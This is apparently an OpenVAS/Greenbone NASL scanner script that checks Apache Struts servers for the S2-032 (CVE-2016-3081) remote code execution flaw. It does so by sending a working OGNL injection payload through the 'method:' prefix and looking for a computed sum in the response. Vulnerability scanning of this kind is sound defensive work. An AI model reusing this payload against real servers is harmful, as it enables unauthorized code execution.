# Copyright (C) 2016 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107007");
  script_version("2021-04-01T07:54:37+0000");
  script_cve_id("CVE-2016-3081");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2021-04-01 10:13:05 +0000 (Thu, 01 Apr 2021)");
  script_tag(name:"creation_date", value:"2016-06-01 10:42:39 +0100 (Wed, 01 Jun 2016)");
  script_name("Apache Struts RCE Vulnerability (S2-032)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_struts_consolidation.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/struts/http/detected");

  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-032");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/136856/Apache-Struts-2.3.28-Dynamic-Method-Invocation-Remote-Code-Execution.html");
  script_xref(name:"Advisory-ID", value:"S2-032");

  script_tag(name:"summary", value:"Apache Struts is prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"insight", value:"The Dynamic Method Invocation bug lets remote users
  execute arbitrary code on the target system. The RCE can be performed via method: prefix
  when Dynamic Method Invocation is enabled.");

  script_tag(name:"impact", value:"Successful exploitation allows unauthorized disclosure
  of information, unauthorized modification and disruption of service.");

  script_tag(name:"affected", value:"Apache Struts 2.3.20 through 2.3.28 (except 2.3.20.3
  and 2.3.24.3).");

  script_tag(name:"solution", value:"Disable Dynamic Method Invocation when possible or
  update to version 2.3.20.3, 2.3.24.3, 2.3.28.1 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

url = get_kb_item("ApacheStruts/FoundApp");
if(!url)
  exit(0);

charset_low = "abcdefghijklmnopqrstuvwxyz";
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
numset = "1234567890";

v_a = rand_str(length:4, charset:charset_low);
v_b = rand_str(length:4, charset:charset_low);

addend_one = rand() % 9999;
addend_two = rand() % 9999;
sum = addend_one + addend_two;

flag = rand_str(length:5, charset:charset);
postdata = "?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,"
           + "%23" + v_a + "%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter"
           + "%28%29%2c%23" + v_a
           + ".print%28%23parameters." + v_b + "%5b0%5d%29%2c%23" + v_a
           + ".print%28new%20java.lang.Integer%28" + addend_one + "%2b" + addend_two + "%29%29%2c%23" + v_a + ".print%28%23parameters."
           + v_b + "%5b0%5d%29%2c%23" + v_a + ".close%28%29,1%3f%23xx%3a%23request.toString&" + v_b +
           "=" + flag;

url = url + postdata;
req = http_post(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req);
stringmatch = flag + sum + flag;

if(buf && buf =~ "^HTTP/1\.[01] 200" && stringmatch >< buf) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);